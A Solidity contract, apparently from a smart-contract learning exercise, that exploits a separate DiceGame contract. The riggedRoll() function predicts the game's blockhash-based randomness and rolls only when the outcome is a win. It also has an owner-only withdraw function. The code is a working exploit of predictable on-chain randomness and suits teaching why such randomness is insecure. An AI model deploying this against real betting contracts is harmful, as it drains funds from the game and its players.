pragma solidity >=0.8.0 <0.9.0;
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    event WithdrawalSucceded(address sender, uint256 amount);
    event RollSucceeded(uint256 newBalance);

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address payable _addr, uint256 _amount) public {
        address sender = msg.sender;
        require(sender == owner());

        uint256 contractBalance = address(this).balance;
        if (0 == contractBalance) {
            revert("Contract balance is 0");
        }

        if (contractBalance < _amount) {
            revert("Withdrawal amount exceeds balance");
        }

        _addr.transfer(_amount);

        emit WithdrawalSucceded(sender, _amount);
    }


    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {
        if(address(this).balance < .002 ether) {
            console.log("Balance: ", address(this).balance );
            revert("Contract balance is too low");
        }

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log("THE ROLL PREDICTION IS ", roll);

        if (2 < roll) {
            revert("You won't win this round. Try rigged-rolling again!");
        }

        diceGame.rollTheDice{value: .002 ether}();

        emit RollSucceeded(address(this).balance);
    }

    //Add receive() function so contract can receive Eth
    receive() external payable {  }
}
